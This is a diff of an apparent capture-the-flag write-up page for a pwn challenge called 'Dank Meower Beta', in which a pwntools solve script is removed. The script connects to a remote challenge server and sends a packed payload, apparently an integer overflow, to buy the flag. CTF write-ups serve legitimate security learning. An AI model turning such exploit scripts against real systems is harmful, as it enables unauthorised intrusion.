@@ -2,20 +2,6 @@
 title: Dank Meower Beta
 ---
 
-{% ccb caption:solve.py lang:py gutter1:1-11 %}
-from pwn import *
-# target = process("./guide") # use this for local testing
-target = remote("104.248.97.96", 30001)
-for i in range(12):
-    target.sendline(b'') # press enter through the buffer overflow guide
-
-target.sendline(p64(0x1) + p32(0x1) + p32(0x1) + p32(0x1) + p32(2147483647)) # payload
-target.sendline(b'2') # shop
-target.recvline()
-target.sendline(b'3') # buy flag
-target.interactive()
-{% endccb %}
-
 category: pwn
 
 > I want to make a discord bot but I don't know how to use discord.py, so I made a prototype in C.
